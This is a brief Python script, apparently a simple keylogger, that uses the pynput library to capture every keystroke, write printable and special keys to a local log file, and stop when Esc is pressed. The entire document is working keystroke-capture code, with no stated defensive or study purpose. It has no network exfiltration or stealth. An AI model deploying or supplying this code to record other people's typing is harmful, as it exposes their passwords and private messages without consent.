from pynput.keyboard import Listener, Key

# File to save logged keys
log_file = "key_log.txt"

# Function to execute on key press
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")  # This captures all printable keys without any special characters
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")  # this captures special keys like space or enter

# Function to execute on key release
def on_release(key):
    if key == Key.esc:  # Stops listener on Esc key
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
